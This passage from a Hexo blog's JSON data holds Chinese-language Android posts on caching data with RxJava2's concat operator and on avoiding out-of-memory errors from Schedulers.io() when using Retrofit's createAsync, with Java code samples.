title=\"关于缓存\"></a>关于缓存</h4><p><em>用户角度：</em><br>做客户端，大部分时候都在追求良好的用户体验，缓存，就要达到一个缓兵之计的效果。因为用户永远是“暴躁”的，页面加载要是有缓存先展示出来，用户就会安心很多。这是一种视觉上的舒服，大多数用户并不在乎这个数据从哪来。<br><em>开发者角度：</em><br>对于客户端程序来说，网络状况是未知而不稳定的，在耗时上面，一次网络请求可能大于本地数据读取好几个数量级。并且，某些及时性不高的数据，并不需要每次都从服务端请求，而是按过期时间来判断是否需要更新缓存，这样也能尽可能地减轻服务器压力。</p>\n<p>总结一下上面的开篇废话就是，用户是暴躁的，服务器是脆弱的，唯一坚挺并且逆来顺受的就是客户端了哈哈哈！</p>\n<h4 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h4><p><strong>目标</strong><br>望闻问切四部曲：<br>UI层发起数据获取意愿（望），打听是否能加载缓存（闻），再访问网络进行远程请求（问），最后刷新缓存至本地存储并返回数据给UI层（切）。<br><strong>药材</strong><br>读缓存的Observable一个（localDataObservable）<br>请求网络数据的Observable一个（remoteDataObservable）<br>关键性的串联操作符contact一个<br><strong>上药</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 闻：本地缓存</span></span><br><span class=\"line\">Observable&lt;DataClass&gt; localDataObservable = Observable.create((ObservableOnSubscribe&lt;DataClass&gt;)</span><br><span class=\"line\">        emitter -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">DataClass</span> <span class=\"variable\">cacheData</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                cacheData = ... <span class=\"comment\">// 缓存数据来源根据具体的业务决定</span></span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 当场抓获，防止异常导致整个事件流中断，致使网络请求无法进行</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cacheData != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// 没毛病就传递给UI层，onNext可以多次调用，比如在循环体中使用很方便</span></span><br><span class=\"line\">                emitter.onNext(cacheData);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            emitter.onComplete(); <span class=\"comment\">// 本次事件结束了，把执行权交给下一个可能存在的事件</span></span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        .subscribeOn(Schedulers.io()); <span class=\"comment\">// 读缓存当然要在子线程</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 问：网络数据</span></span><br><span class=\"line\">Observable&lt;DataClass&gt; remoteDataObservable = RetrofitFactory.createRequest()</span><br><span class=\"line\">        .getRemoteData()</span><br><span class=\"line\">        .subscribeOn(Schedulers.io())</span><br><span class=\"line\">        .map(dataResponse -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">DataClass</span> <span class=\"variable\">remoteData</span> <span class=\"operator\">=</span> dataResponse;</span><br><span class=\"line\">            <span class=\"comment\">// 读了新数据就该写缓存了</span></span><br><span class=\"line\">            <span class=\"comment\">// ...具体可以做一些类似expireTime的判断，还可以在此处再订阅一个异步写缓存的Observable，达到读写分离的效果</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> remoteData;</span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>由于这里是用到了RxJava2+Retrofit2的结构，上述的RetrofitFactory.createRequest().getRemoteData()是对Retrofit进行了简单封装，具体请见：<a href=\"https://blog.csdn.net/ysy950803/article/details/84930656\">RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求</a></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 使用contact操作符将两个事件串联起来，当上述的onComplete执行过后，就会开始进行网络请求</span></span><br><span class=\"line\">Observable.concat(localDataObservable, remoteDataObservable)</span><br><span class=\"line\">        .observeOn(AndroidSchedulers.mainThread(), <span class=\"literal\">true</span>) <span class=\"comment\">// 这里delayError设为true，防止onNext在下游还没消费完，就被onComplete结束掉了</span></span><br><span class=\"line\">        .subscribe(data -&gt; &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 最终得到的data对于调用侧的UI层来说，并不需要关心其来源，只管消费就好了</span></span><br><span class=\"line\">            <span class=\"comment\">// ... 展示到UI</span></span><br><span class=\"line\">        &#125;, throwable -&gt; &#123;</span><br><span class=\"line\">           <span class=\"comment\">// 网络请求的异常捕捉，因为读缓存过程中的异常已经被我们提前捕捉了，这里就不会再出现</span></span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure>\n\n<p>OK，药到病除，这里基本上是一个模板，以及一些细节处理。<br>运用到实际业务中还需要大家细细优化。比如说，一些页面可能并不需要每次都串联网络请求，而是需要先判断缓存是否过期，那么就可以在localDataObservable中主动抛出onError来中断事件流，以达到阻止网络请求的目的。</p>\n"},{"layout":"post","title":"RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求","subtitle":"知名库之间的故事。","date":"2018-12-08T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 情景\n\n前不久项目遇到了偶现的OOM问题，看调用栈发现有RxJava相关，我们项目以RxJava2+RxAndroid+Retrofit2+OkHttp为基础设施的。\n上谷歌搜了一转，最终竟踏入了[RxAndroid](https://github.com/ReactiveX/RxAndroid)的GitHub issue区，发现有个老外和我情景类似，原帖链接在此：https://github.com/ReactiveX/RxAndroid/issues/387， 他说他只用Retrofit发起1500个请求没毛病，但是加上RxAndroid就炸了，他怀疑RxAndroid有Bug。\n这个问题被项目Owner（即JakeWharton大神）回复了，他给大家解释了这种框架组合的正确用法。下面是他的原话：\n\n> The problem is that **Schedulers.io()** uses a cached thread pool without a limit and thus is trying to create 1500 threads. You should consider using a **Scheduler** that has a fixed limit of threads, or using RxJava 2.x's **parallel()** operator to parallelize the operation to a fixed number of workers.\n> If you're using raw Retrofit by default it uses OkHttp's dispatcher which limits the threads to something like 64 (with a max of 5 per host). That's why you aren't seeing it fail.\n> If you use **createAsync()** when creating the **RxJava2CallAdapterFactory** it will create fully-async **Observable** instances that don't require a **subscribeOn** and which use OkHttp's **Dispatcher** just like Retrofit would otherwise. Then you only need **observeOn** to move back to the main thread, and you avoid all additional thread creation.\n\n大概意思是说，Schedulers.io()会用一个没有限制的缓存线程池，所以你需要一个有线程数量限制的调度器，或者用parallel操作符来进行并发操作（否则容易OOM）。\nRetrofit默认组合OkHttp所用的线程数量是有限制的（比如64个），因此这位提问的老外才没出问题。\nJake大神建议，配合RxAndroid时，使用RxJava2CallAdapterFactory的createAsync方法来构造Retrofit实例，这样就会创建一个完全异步的Observeable，不需要再把它单独丢到自己指定的线程调度器（即Schedulers.io()）当中去，只需要observeOn主线程即可。\n\n## 改进\n\n看完这段话后，我发现自己的项目还真躺枪了，原本我是这么写的：\n\n```java\npublic interface RetrofitInterface {\n    // 获取远程服务器的数据\n    @GET(\"test/getData\")\n    Observable<DataClass> getRemoteData();\n}\n```\n\n```java\n...\n    public static RetrofitInterface createRequest() {\n        return getRetrofit().create(RetrofitInterface.class);\n    }\n    private synchronized static Retrofit getRetrofit() {\n        if (sRetrofit == null) {\n            sRetrofit = new Retrofit.Builder()\n                    .baseUrl(\"http://test.com\")\n                    .client(getHttpClient())\n                    .addConverterFactory(GsonConverterFactory.create())\n                    .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) // 【问题主要是这里】\n                    .build();\n        }\n        return sRetrofit;\n    }\n...\n```\n\n按照上面的意思，这里就该用**createAsync**而不是**create**了。\n然后我的网络请求是这么写的：\n\n```java\n// 创建网络请求的Observable\nObservable<DataClass> remoteDataObservable = RetrofitFactory.createRequest()\n        .getRemoteData()\n        .subscribeOn(Schedulers.io()) // 【问题主要是这里】\n        .map(dataResponse -> {\n            DataClass remoteData = dataResponse;\n            // 假装对返回数据做了一些处理\n            // ...\n            return remoteData;\n        })\n        .observeOn(AndroidSchedulers.mainThread()); // 在UI线程中暗中观察并及时消费\n```\n\n按照上面的意思，这里**createAsync**已经会为你指定异步线程了，你就无需在外部再去调用**subscribeOn(Schedulers.io())**，所以把这句去掉。\n**注意：** 这两步改动是一起的，缺一不可。\n如此一来，就能避免这方面带来的内存溢出问题了。所以这也给我们提了个醒，Schedulers.io()不要随便用，它只适合做一些轻量的异步工作，不要试图用它支撑高并发。\n\n## 后话\n\n针对这个问题，我特意去看了看createAsync方法的源码注释：\n\n```java\n  /**\n   * Returns an instance which creates asynchronous observables. Applying\n   * {@link Observable#subscribeOn} has no effect on stream types created by this factory.\n   */\n  public static RxJava2CallAdapterFactory createAsync() {\n    return new RxJava2CallAdapterFactory(null, true);\n  }\n```\n\n没错，它专门提到：subscribeOn方法对createAsync最终构造出来的Observeable是没有影响的，也就是说，只要你用了createAsync，即便后续再调用subscribeOn(Schedulers.io())，都没什么用处，并不会作用到网络请求。一直到你调用observeOn之前（包括map等操作），线程都不会切换。\n\n**调料包：** 关于RxJava的线程切换及操作符作用域，看看这篇应该就够了：https://www.jianshu.com/p/59c3d6bb6a6b\n","source":"_posts/2018-12-09-RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求.md","raw":"---\nlayout:     post\ntitle:      RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求\nsubtitle:   知名库之间的故事。\ndate:       2018-12-09\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Java\n    - Android\n---\n\n## 情景\n\n前不久项目遇到了偶现的OOM问题，看调用栈发现有RxJava相关，我们项目以RxJava2+RxAndroid+Retrofit2+OkHttp为基础设施的。\n上谷歌搜了一转，最终竟踏入了[RxAndroid](https://github.com/ReactiveX/RxAndroid)的GitHub issue区，发现有个老外和我情景类似，原帖链接在此：https://github.com/ReactiveX/RxAndroid/issues/387， 他说他只用Retrofit发起1500个请求没毛病，但是加上RxAndroid就炸了，他怀疑RxAndroid有Bug。\n这个问题被项目Owner（即JakeWharton大神）回复了，他给大家解释了这种框架组合的正确用法。下面是他的原话：\n\n> The problem is that **Schedulers.io()** uses a cached thread pool without a limit and thus is trying to create 1500 threads. You should consider using a **Scheduler** that has a fixed limit of threads, or using RxJava 2.x's **parallel()** operator to parallelize the operation to a fixed number of workers.\n> If you're using raw Retrofit by default it uses OkHttp's dispatcher which limits the threads to something like 64 (with a max of 5 per host). That's why you aren't seeing it fail.\n> If you use **createAsync()** when creating the **RxJava2CallAdapterFactory** it will create fully-async **Observable** instances that don't require a **subscribeOn** and which use OkHttp's **Dispatcher** just like Retrofit would otherwise. Then you only need **observeOn** to move back to the main thread, and you avoid all additional thread creation.\n\n大概意思是说，Schedulers.io()会用一个没有限制的缓存线程池，所以你需要一个有线程数量限制的调度器，或者用parallel操作符来进行并发操作（否则容易OOM）。\nRetrofit默认组合OkHttp所用的线程数量是有限制的（比如64个），因此这位提问的老外才没出问题。\nJake大神建议，配合RxAndroid时，使用RxJava2CallAdapterFactory的createAsync方法来构造Retrofit实例，这样就会创建一个完全异步的Observeable，不需要再把它单独丢到自己指定的线程调度器（即Schedulers.io()）当中去，只需要observeOn主线程即可。\n\n## 改进\n\n看完这段话后，我发现自己的项目还真躺枪了，原本我是这么写的：\n\n```java\npublic interface RetrofitInterface {\n    // 获取远程服务器的数据\n    @GET(\"test/getData\")\n    Observable<DataClass> getRemoteData();\n}\n```\n\n```java\n...\n    public static RetrofitInterface createRequest() {\n        return getRetrofit().create(RetrofitInterface.class);\n    }\n    private synchronized static Retrofit getRetrofit() {\n        if (sRetrofit == null) {\n            sRetrofit = new Retrofit.Builder()\n                    .baseUrl(\"http://test.com\")\n                    .client(getHttpClient())\n                    .addConverterFactory(GsonConverterFactory.create())\n                    .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) // 【问题主要是这里】\n                    .build();\n        }\n        return sRetrofit;\n    }\n...\n```\n\n按照上面的意思，这里就该用**createAsync**而不是**create**了。\n然后我的网络请求是这么写的：\n\n```java\n// 创建网络请求的Observable\nObservable<DataClass> remoteDataObservable = RetrofitFactory.createRequest()\n        .getRemoteData()\n        .subscribeOn(Schedulers.io()) // 【问题主要是这里】\n        .map(dataResponse -> {\n            DataClass remoteData = dataResponse;\n            // 假装对返回数据做了一些处理\n            // ...\n            return remoteData;\n        })\n        .observeOn(AndroidSchedulers.mainThread()); // 在UI线程中暗中观察并及时消费\n```\n\n按照上面的意思，这里**createAsync**已经会为你指定异步线程了，你就无需在外部再去调用**subscribeOn(Schedulers.io())**，所以把这句去掉。\n**注意：** 这两步改动是一起的，缺一不可。\n如此一来，就能避免这方面带来的内存溢出问题了。所以这也给我们提了个醒，Schedulers.io()不要随便用，它只适合做一些轻量的异步工作，不要试图用它支撑高并发。\n\n## 后话\n\n针对这个问题，我特意去看了看createAsync方法的源码注释：\n\n```java\n  /**\n   * Returns an instance which creates asynchronous observables. Applying\n   * {@link Observable#subscribeOn} has no effect on stream types created by this factory.\n   */\n  public static RxJava2CallAdapterFactory createAsync() {\n    return new RxJava2CallAdapterFactory(null, true);\n  }\n```\n\n没错，它专门提到：subscribeOn方法对createAsync最终构造出来的Observeable是没有影响的，也就是说，只要你用了createAsync，即便后续再调用subscribeOn(Schedulers.io())，都没什么用处，并不会作用到网络请求。一直到你调用observeOn之前（包括map等操作），线程都不会切换。\n\n**调料包：** 关于RxJava的线程切换及操作符作用域，看看这篇应该就够了：https://www.jianshu.com/p/59c3d6bb6a6b\n","slug":"RxJava2开发小记：用CompositeDisposable来“安排”Retrofit网络请求","published":1,"updated":"2024-03-25T07:31:25.851Z","comments":1,"photos":[],"link":"","_id":"cluaufh0d000bthe683woamoa","content":"<h2 id=\"情景\"><a href=\"#情景\" class=\"headerlink\" title=\"情景\"></a>情景</h2><p>前不久项目遇到了偶现的OOM问题，看调用栈发现有RxJava相关，我们项目以RxJava2+RxAndroid+Retrofit2+OkHttp为基础设施的。<br>上谷歌搜了一转，最终竟踏入了<a href=\"https://github.com/ReactiveX/RxAndroid\">RxAndroid</a>的GitHub issue区，发现有个老外和我情景类似，原帖链接在此：<a href=\"https://github.com/ReactiveX/RxAndroid/issues/387%EF%BC%8C\">https://github.com/ReactiveX/RxAndroid/issues/387，</a> 他说他只用Retrofit发起1500个请求没毛病，但是加上RxAndroid就炸了，他怀疑RxAndroid有Bug。<br>这个问题被项目Owner（即JakeWharton大神）回复了，他给大家解释了这种框架组合的正确用法。下面是他的原话：</p>\n<blockquote>\n<p>The problem is that <strong>Schedulers.io()</strong> uses a cached thread pool without a limit and thus is trying to create 1500 threads. You should consider using a <strong>Scheduler</strong> that has a fixed limit of threads, or using RxJava 2.x’s <strong>parallel()</strong> operator to parallelize the operation to a fixed number of workers.<br>If you’re using raw Retrofit by default it uses OkHttp’s dispatcher which limits the threads to something like 64 (with a max of 5 per host). That’s why you aren’t seeing it fail.<br>If you use <strong>createAsync()</strong> when creating the <strong>RxJava2CallAdapterFactory</strong> it will create fully-async <strong>Observable</strong> instances that don’t require a <strong>subscribeOn</strong> and which use OkHttp’s <strong>Dispatcher</strong> just like Retrofit would otherwise. Then you only need <strong>observeOn</strong> to move back to the main thread, and you avoid all additional thread creation.</p>\n</blockquote>\n<p>大概意思是说，Schedulers.io()会用一个没有限制的缓存线程池，所以你需要一个有线程数量限制的调度器，或者用parallel操作符来进行并发操作（否则容易OOM）。<br>Retrofit默认组合OkHttp所用的线程数量是有限制的（比如64个），因此这位提问的老外才没出问题。<br>Jake大神建议，配合RxAndroid时，使用RxJava2CallAdapterFactory的createAsync方法来构造Retrofit实例，这样就会创建一个完全异步的Observeable，不需要再把它单独丢到自己指定的线程调度器（即Schedulers.io()）当中去，只需要observeOn主线程即可。</p>\n<h2 id=\"改进\"><a href=\"#改进\" class=\"headerlink\" title=\"改进\"></a>改进</h2><p>看完这段话后，我发现自己的项目还真躺枪了，原本我是这么写的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">RetrofitInterface</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获取远程服务器的数据</span></span><br><span class=\"line\">    <span class=\"meta\">@GET(&quot;test/getData&quot;)</span></span><br><span class=\"line\">    Observable&lt;DataClass&gt; <span class=\"title function_\">getRemoteData</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> RetrofitInterface <span class=\"title function_\">createRequest</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getRetrofit().create(RetrofitInterface.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> Retrofit <span class=\"title function_\">getRetrofit</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (sRetrofit == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            sRetrofit = <span class=\"keyword\">new</span> <span class=\"title class_\">Retrofit</span>.Builder()</span><br><span class=\"line\">                    .baseUrl(<span class=\"string\">&quot;http://test.com&quot;</span>)</span><br><span class=\"line\">                    .client(getHttpClient())</span><br><span class=\"line\">                    .addConverterFactory(GsonConverterFactory.create())</span><br><span class=\"line\">                    .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) <span class=\"comment\">// 【问题主要是这里】</span></span><br><span class=\"line\">                    .build();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sRetrofit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>按照上面的意思，这里就该用<strong>createAsync</strong>而不是<strong>create</strong>了。<br>然后我的网络请求是这么写的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 创建网络请求的Observable</span></span><br><span class=\"line\">Observable&lt;DataClass&gt; remoteDataObservable = RetrofitFactory.createRequest()</span><br><span class=\"line\">        .getRemoteData()</span><br><span class=\"line\">        .subscribeOn(Schedulers.io()) <span class=\"comment\">// 【问题主要是这里】</span></span><br><span class=\"line\">        .map(dataResponse -&gt; &#123;</span><br><span class=\"line\">            <span class=\"type\">DataClass</span> <span class=\"variable\">remoteData</span> <span class=\"operator\">=</span> dataResponse;</span><br><span class=\"line\">            <span class=\"comment\">// 假装对返回数据做了一些处理</span></span><br><span class=\"line\">            <span class=\"comment\">// ...</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> remoteData;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        .observeOn(AndroidSchedulers.mainThread()); <span class=\"comment\">// 在UI线程中暗中观察并及时消费</span></span><br></pre></td></tr></table></figure>\n\n<p>按照上面的意思，这里<strong>createAsync</strong>已经会为你指定异步线程了，你就无需在外部再去调用**subscribeOn(Schedulers.io())**，所以把这句去掉。<br><strong>注意：</strong> 这两步改动是一起的，缺一不可。<br>如此一来，就能避免这方面带来的内存溢出问题了。所以这也给我们提了个醒，Schedulers.io()不要随便用，它只适合做一些轻量的异步工作，不要试图用它支撑高并发。</p>\n<h2 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h2><p>针对这个问题，我特意去看了看createAsync方法的源码注释：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Returns an instance which creates asynchronous observables. Applying</span></span><br><span class=\"line\"><span class=\"comment\"> * &#123;<span class=\"doctag\">@link</span> Observable#subscribeOn&#125; has no effect on stream types created by this factory.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> RxJava2CallAdapterFactory <span class=\"title function_\">createAsync</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RxJava2CallAdapterFactory</span>(<span class=\"literal\">null</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>没错，它专门提到：subscribeOn方法对createAsync最终构造出来的Observeable是没有影响的，也就是说，只要你用了createAsync，即便后续再调用subscribeOn(Schedulers.io())，都没什么用处，并不会作用到网络请求。一直到你调用observeOn之前（包括map等操作），线程都不会切换。</p>\n<p><strong>调料包：</strong> 关于RxJava的线程切换及操作符作用域，看看这篇应该就够了：<a href=\"https://www.jianshu.com/p/59c3d6bb6a6b\">https://www.jianshu.com/p/59c3d6bb6a6b</a></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"情景\"><a href=\"#情景\" class=\"headerlink\" title=\"情景\"></a>情景</h2><p>前不久项目遇到了偶现的OOM问题，看调用栈发现有RxJava相关，我们项目以RxJava2+RxAndroid+Retrofit2+OkHttp为基础设施的。<br>上谷歌搜了一转，最终竟踏入了<a href=\"https://github.com/ReactiveX/RxAndroid\">RxAndroid</a>的GitHub issue区，发现有个老外和我情景类似，原帖链接在此：<a href=\"https://github.com/ReactiveX/RxAndroid/issues/387%EF%BC%8C\">https://github.com/ReactiveX/RxAndroid/issues/387，</a> 他说他只用Retrofit发起1500个请求没毛病，但是加上RxAndroid就炸了，他怀疑RxAndroid有Bug。<br>这个问题被项目Owner（即JakeWharton大神）回复了，他给大家解释了这种框架组合的正确用法。下面是他的原话：</p>\n<blockquote>\n<p>The problem is that <strong>Schedulers.io()</strong> uses a cached thread pool without a limit and thus is trying to create 1500 threads. You should consider using a <strong>Scheduler</strong> that has a fixed limit of threads, or using RxJava 2.x’s <strong>parallel()</strong> operator to parallelize the operation to a fixed number of workers.<br>If you’re using raw Retrofit by default it uses OkHttp’s dispatcher which limits the threads to something like 64 (with a max of 5 per host). That’s why you aren’t seeing it fail.<br>If you use <strong>createAsync()</strong> when creating the <strong>RxJava2CallAdapterFactory</strong> it will create fully-async <strong>Observable</strong> instances that don’t require a <strong>subscribeOn</strong> and which use OkHttp’s <strong>Dispatcher</strong> just like Retrofit would otherwise. Then you only need <strong>observeOn</strong> to move back to the main thread, and you avoid all additional thread creation.</p>\n</blockquote>\n<p>大概意思是说，Schedulers.io()会用一个没有限制的缓存线程池，所以你需要一个有线程数量限制的调度器，或者用parallel操作符来进行并发操作（否则容易OOM）。<br>Retrofit默认组合OkHttp所用的线程数量是有限制的（比如64个），因此这位提问的老外才没出问题。<br>Jake大神建议，配合RxAndroid时，使用RxJava2CallAdapterFactory的createAsync方法来构造Retrofit实例，这样就会创建一个完全异步的Observeable，不需要再把它单独丢到自己指定的线程调度器（即Schedulers.io()）当中去，只需要observeOn主线程即可。</p>\n<h2 id=\"改进\"><a href=\"#改进\" class=\"headerlink\" title=\"改进\"></a>改进</h2><p>看完这段话后，我发现自己的项目还真躺枪了，原本我是这么写的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">RetrofitInterface</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获取远程服务器的数据</span></span><br><span class=\"line\">    <span class=\"meta\">@GET(&quot;test/getData&quot;)</span></span><br><span class=\"line\">    Observable&lt;DataClass&gt; <span class=\"title function_\">getRemoteData</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> RetrofitInterface <span class=\"title function_\">createRequest</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getRetrofit().create(RetrofitInterface.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">static</span> Retrofit <span class=\"title function_\">getRetrofit</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (sRetrofit == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            sRetrofit = <span class=\"keyword\">new</span> <span class=\"title class_\">Retrofit</span>.Builder()</span><br><span class=\"line\">                    .baseUrl(<span class=\"string\">&quot;http://test.com&quot;</span>)</span><br><span class=\"line\">                    .client(getHttpClient())</span><br><span class=\"line\">                    .addConverterFactory(GsonConverterFactory.create())</span><br><span class=\"line\">                    .addCallAdapterFactory(RxJava2CallAdapterFactory.create()) <span class=\"comment\">// 【问题主要是这里】</span></span><br><span class=\"line\">                    .build();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> sRetrofit;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>按照上面的意思，这里就该用<strong>createAsync</strong>而不是<strong>create</strong>了。<br>然后我的网络请求是这么写的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 创建网络请求的Observable</span></span><br><span class=\"line\">Observable&lt;DataClass&gt; remoteDataObservable = RetrofitFactory.createRequest()</span><br><span class=\"line\">        .getRemoteData()</span><br><span class=\"line\">        .subscribeOn(Schedulers.io()) <span class=\"comment\">// 【问题主要是这里】</span></span><br><span class=\"line\">        .map(dataResponse 